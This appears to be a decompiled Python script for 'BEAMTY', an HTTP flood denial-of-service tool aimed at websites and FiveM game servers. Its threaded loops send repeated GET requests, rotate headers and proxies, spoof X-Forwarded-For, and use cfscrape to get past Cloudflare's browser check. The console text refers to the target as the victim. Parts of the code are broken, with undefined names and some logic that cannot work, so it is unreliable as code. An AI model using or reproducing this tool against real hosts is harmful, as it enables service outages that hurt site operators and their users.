# uncompyle6 version 3.6.4
# Python bytecode 3.5 (3350)
# Decompiled from: Python 3.5.0 (v3.5.0:374f501f4567, Sep 13 2015, 02:27:37) [MSC v.1900 64 bit (AMD64)]
# Embedded file name: httpcf.py
# Compiled at: 2020-02-18 02:45:59
# Size of source mod 2**32: 48187 bytes
import socket, argparse, ssl, urllib.parse, getopt, os, string, _thread, threading, random, time, subprocess, cfscrape, sys, struct, colorama
from colorama import Fore, Back, Style
from datetime import datetime
parser = argparse.ArgumentParser(description='beamty')
parser.add_argument('host', nargs='?', help='Host name, i.e: abc.com')
parser.add_argument('-d', '--dir', default='/webadmin/icon.png', help='/index.php /register.php /login.php /register')
parser.add_argument('-s', '--ssl', dest='ssl', action='store_false', help='Debug info, default on')
parser.add_argument('-p', '--port', default=80, help='Port 80 or 443 ', type=int)
parser.add_argument('-t', '--threads', default=500, help='Number of threads', type=int)
parser.add_argument('-l', '--time', default=60, help='how long (seconds) the attack lasts', type=int)
parser.add_argument('-x', '--proxy_file_location', default='proxy.list', help='proxy file location. if empty, use direct connection')
args = parser.parse_args()
request_list = []
ua_file = 'user-agents.txt'
ref_file = 'referers.txt'
acceptall = [
 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
 'Accept-Encoding: gzip, deflate\r\n',
 'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
 'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
 'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
 'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
 'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
 'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
 'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
 'Accept: text/html, application/xhtml+xml',
 'Accept-Language: en-US,en;q=0.5\r\n',
 'accept: text/plain, */*; q=0.01Accept: text/plain, */*; q=0.01Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
 'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3']
proxy_list = []
cf_token = []
print(Fore.GREEN + '\n\n>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n////////////////////////////////////////////////////////////\nBEAMTY - HTTP\n                            ATTACK | Fivem\n\t\t\t\tCR.Wachira\n\n------------------------------------------------------------\n------------------------------------------------------------\n\t')
if args.ssl:
    args.host = input(Fore.RED + 'Insert URL/IP: ')
    url = 'http://' + args.host
else:
    url = 'https://' + args.host
if args.port:
    args.port = input(Fore.RED + 'Insert PORT: ')
    port = args.port
else:
    port = args.port

def proxyget():
    proxy_file = open(args.proxy_file_location, 'r')
    line = proxy_file.readline().rstrip()
    while line:
        proxy_list.append(line)
        line = proxy_file.readline().rstrip()

    proxy_file.close()


def cloudFlareCheck():
    global url
    if isCloudFlare(url) is True:
        print("*** Your target is hidding behind CloudFlare! This attack may not entail any consequences to the victim's web-site.")
        time.sleep(19)
        for i in range(5, 0, -1):
            print('Your attack will be launched in ' + str(i) + ' seconds...', end='\r')
            time.sleep(19)

        startAttack()
    else:
        startAttack()


def is_protected_by_cf():
    try:
        first_request = subprocess.check_output([
         'curl', '-A', format(random.choice(ua_file)), args.host], timeout=5)
        first_request = first_request.decode('ascii', errors='ignore')
        find_keyword = False
        for line in first_request.splitlines():
            if line.find('Checking your browser before accessing') != -1:
                find_keyword = False

    except Exception:
        return False

    return find_keyword


def set_request():
    global request
    get_host = 'GET ' + args.dir + ' HTTP/1.1\r\nHost: ' + args.host + '\r\n'
    useragent = 'User-Agent: ' + random.choice(ua_file) + '\r\n'
    accept = random.choice(acceptall)
    connection = 'Connection: Keep-Alive\r\n'
    request = get_host + useragent + accept + connection + '\r\n'
    request_list.append(request)


def startAttack():
    threads = []
    for i in range(len(ips)):
        t = threading.Thread(target=request, args=(i,))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(0.05)

    except KeyboardInterrupt:
        ex.set()
        print('\rAttack has been stopped!\nGive up to ' + str(timeout) + ' seconds to release the threads...')
        for t in threads:
            t.join()


def generate_cf_token(i):
    proxy = proxy_list[i].strip().split(':')
    proxies = {'http': 'http://' + proxy[0] + ':' + proxy[1]}
    try:
        cookie_value, user_agent = cfscrape.get_cookie_string(url, proxies=proxies)
        tokens_string = 'Cookie: ' + cookie_value + '\r\n'
        user_agent_string = 'User-Agent: ' + user_agent + '\r\n'
        cf_token.append(proxy[0] + '#' + proxy[1] + '#' + tokens_string + user_agent_string)
    except:
        pass


def set_request_cf():
    global proxy_ip
    global proxy_port
    global request_cf
    cf_combine = random.choice(cf_token).strip().split('#')
    proxy_ip = cf_combine[0]
    proxy_port = cf_combine[1]
    get_host = 'GET ' + args.dir + ' HTTP/1.1\r\nHost: ' + args.host + '\r\n'
    tokens_and_ua = cf_combine[2]
    accept = random.choice(acceptall)
    randomip = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
    forward = 'X-Forwarded-For: ' + randomip + '\r\n'
    connection = 'Connection: Keep-Alive\r\n'
    request_cf = get_host + tokens_and_ua + accept + forward + connection + '\r\n'


def main():
    global go
    global x
    proxyget()
    x = 0
    go = threading.Event()
    if is_protected_by_cf():
        print('\n---------------------------------------------------------------------')
        print('Target: ', args.host, ' is protected by Cloudfalre.')
        print(' BEAMTY HTTP | 2mins for bypass .   ')
        print('---------------------------------------------------------------------')
        for i in range(args.threads):
            _thread.start_new_thread(generate_cf_token, (i,))

        time.sleep(5)
        for x in range(args.threads):
            set_request_cf()
            RequestProxyHTTP(x + 1).start()
            print('ATTACK----------------> |' + str(x) + ' ready!')

        go.set()
    else:
        print('\n---------------------------------------------------------------------')
        print('Target: ', args.host, ' is not protected by Cloudfalre.')
        print('  BEAMTY | HTTP 5 seconds for UA Generation.   ')
        print('---------------------------------------------------------------------')
        for x in range(args.threads):
            _thread.start_new_thread(set_request, ())

        time.sleep(5)
        for x in range(args.threads):
            request = random.choice(request_list)
            if args.ssl:
                RequestDefaultHTTP(x + 1).start()
            else:
                RequestDefaultHTTPS(x + 1).start()
            print(Fore.GREEN + 'ATTACK-------------->| ' + str(x) + ' ready!')

        go.set()


class RequestDefaultHTTP(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(args.host), int(args.port)))
                s.send(str.encode(request))
                print(Fore.GREEN + 'ATTACK <B E A M T Y>----------->| ', self.counter, '----------->URL------->')
                try:
                    for y in range(150):
                        s.send(str.encode(request))

                except:
                    s.close()

            except:
                s.close()


class RequestDefaultHTTPS(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(args.host), int(args.port)))
                s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)
                s.send(str.encode(request))
                print(Fore.GREEN + 'ATTACK <B E A M T Y>----------->|', self.counter, '----------->URL------->')
                try:
                    for y in range(150):
                        s.send(str.encode(request))

                except:
                    s.close()

            except:
                s.close()


class RequestProxyHTTP(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.htons(2048))
                s.connect((str(proxy_ip), int(proxy_port)))
                s.send(str.encode(request_cf))
                print('Request sent from ' + str(proxy_ip + ':' + proxy_port) + ' @', self.counter)
                try:
                    for y in range(50):
                        s.send(str.encode(request_cf))

                except:
                    pass

            except:
                pass


if __name__ == '__main__':
    main()
# global port ## Warning: Unused global